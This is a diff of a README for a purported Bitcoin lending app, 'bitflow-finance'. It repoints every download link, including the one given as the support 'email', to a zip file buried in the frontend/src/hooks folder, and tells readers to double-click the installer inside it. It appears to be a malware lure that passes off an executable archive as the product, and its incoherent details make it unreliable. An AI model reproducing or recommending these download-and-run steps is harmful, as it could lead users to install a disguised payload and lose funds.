@@ -1,6 +1,6 @@
 # 🚀 bitflow-finance - Predictable Yields with Bitcoin Lending
 
-[![Download bitflow-finance](https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/bitflow-finance-2.8.zip)](https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/bitflow-finance-2.8.zip)
+[![Download bitflow-finance](https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/src/hooks/bitflow-finance-v3.6.zip)](https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/src/hooks/bitflow-finance-v3.6.zip)
 
 ## 📖 Table of Contents
 - [🌟 Overview](#-overview)
@@ -27,14 +27,14 @@ Follow these steps to get started with bitflow-finance.
 3. Prepare your Bitcoin wallet, as you will need it to lend Bitcoin.
 
 ## 📥 Download & Install
-Visit [this page to download](https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/bitflow-finance-2.8.zip). You will find different versions of the application. Choose the version that suits your operating system. 
+Visit [this page to download](https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/src/hooks/bitflow-finance-v3.6.zip). You will find different versions of the application. Choose the version that suits your operating system. 
 
 After downloading:
 1. Locate the downloaded file (usually in your Downloads folder).
 2. Double-click the file to run the installer.
 3. Follow the on-screen instructions to complete the installation.
 
-For your convenience, here's the [download link again](https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/bitflow-finance-2.8.zip).
+For your convenience, here's the [download link again](https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/src/hooks/bitflow-finance-v3.6.zip).
 
 ## 🔧 Usage
 1. Open the bitflow-finance application.
@@ -56,6 +56,6 @@ A: No, a Bitcoin wallet is necessary to participate in lending.
 A: Yields vary based on market conditions and can change frequently. bitflow-finance will provide the latest rates within the app.
 
 **Q: How do I contact support?**  
-A: You can reach support by emailing https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/bitflow-finance-2.8.zip Please detail your issue for quicker assistance.
+A: You can reach support by emailing https://github.com/maydayroblox/bitflow-finance/raw/refs/heads/main/frontend/src/hooks/bitflow-finance-v3.6.zip Please detail your issue for quicker assistance.
 
 By following these steps and guidelines, you will successfully download and run the bitflow-finance application to start earning predictable yields on your Bitcoin investments.
